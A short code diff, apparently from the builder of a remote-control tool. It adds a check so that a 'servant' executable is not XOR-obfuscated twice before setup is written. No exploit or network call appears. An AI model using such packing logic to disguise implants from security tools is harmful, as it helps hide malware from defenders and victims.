@@ -385,6 +385,17 @@ BOOL XorEncryptFile(LPCTSTR lpszFilePath, UINT encryptSize)
 
 	if (dwOutFileSize != nFileSize)
 		goto END;
+	
+	//检查PE是不是已经加密过
+
+	char* head = "EW";
+
+	if (memcmp(head,lpFileContext,2) == 0)
+	{
+		bRet = TRUE;
+		goto END;
+	}
+
 
 	XorFibonacciCrypt(lpFileContext,nFileSize,lpFileContext,3,5);
 	SetFilePointer(hFile,0,0,FILE_BEGIN);
@@ -500,6 +511,7 @@ BOOL WriteSetup(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError)
 	CloseHandle(hFile);
 	
 	UINT encryptSize = 4096;
+
 	//加密文件
   	if (!XorEncryptFile(strTempServant, encryptSize))
   	{
